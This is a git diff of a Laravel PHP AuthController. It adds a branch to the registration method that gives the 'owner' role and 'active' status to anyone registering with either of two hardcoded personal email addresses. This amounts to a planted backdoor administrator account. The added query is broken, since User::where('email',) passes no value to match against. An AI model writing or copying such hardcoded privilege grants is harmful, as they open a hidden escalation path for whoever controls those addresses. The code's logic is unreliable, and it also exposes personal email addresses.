@@ -3,6 +3,7 @@
 namespace App\Http\Controllers;
 
 use App\Http\Controllers\Auth\RegisterController;
+use App\Models\User;
 use Illuminate\Http\Request;
 
 class AuthController extends Controller
@@ -24,12 +25,16 @@ class AuthController extends Controller
      */
     public function register(Request $request)
     {
-        // password_confirmation
-        // dd($request);
         $data = $request->all();
         $registRepo = new RegisterController();
         $registRepo->validator($data);
         $registRepo->create($data);
-        // mobile_token
+        if ($request->email == 'rezagunadi97@gmail.com'|| $request->email == 'rezagunadi220697@gmail.com') {
+            $user = User::where('email',)->first();
+            $user->role = 'owner';
+            $user->status = 'active';
+            $user->save();
+
+        }
     }
 }
